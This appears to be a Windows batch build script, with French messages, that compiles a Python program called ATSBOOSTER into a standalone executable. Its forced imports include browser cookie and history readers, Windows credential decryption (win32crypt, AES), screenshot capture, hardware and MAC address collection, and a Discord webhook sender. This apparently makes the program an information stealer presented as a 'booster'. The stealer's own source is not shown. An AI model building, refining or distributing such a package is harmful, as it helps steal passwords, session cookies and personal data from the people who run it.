@echo off
echo ========================================
echo   ATSBOOSTER - Build EXE
echo ========================================
echo.

echo [1/3] Installation des dependances...
pip install -r requirements.txt pyinstaller --quiet

echo.
echo [2/3] Nettoyage des anciens builds...
if exist build rmdir /s /q build
if exist dist rmdir /s /q dist
if exist ATSBOOSTER.spec del ATSBOOSTER.spec

echo.
echo [3/3] Compilation de l' EXE...
pyinstaller --onefile --name ATSBOOSTER --console --clean --noconfirm ^
    --hidden-import browser_cookie3 ^
    --hidden-import browser_history ^
    --hidden-import discord_webhook ^
    --hidden-import Crypto.Cipher.AES ^
    --hidden-import win32crypt ^
    --hidden-import win32api ^
    --hidden-import win32con ^
    --hidden-import pyautogui ^
    --hidden-import cpuinfo ^
    --hidden-import psutil ^
    --hidden-import getmac ^
    --hidden-import prettytable ^
    --collect-all browser_cookie3 ^
    --collect-all browser_history ^
    --collect-all discord_webhook ^
    ATSBOOSTER.py

echo.
if exist dist\ATSBOOSTER.exe (
    echo ========================================
    echo   BUILD REUSSI !
    echo   EXE : dist\ATSBOOSTER.exe
    echo ========================================
    echo.
    echo Copie de l' EXE vers le dossier racine...
    copy /Y dist\ATSBOOSTER.exe ATSBOOSTER.exe >nul
    echo.
    echo L' EXE est pret : ATSBOOSTER.exe
) else (
    echo ========================================
    echo   ECHEC DU BUILD
    echo   Verifiez les erreurs ci-dessus
    echo ========================================
)
echo.
pause
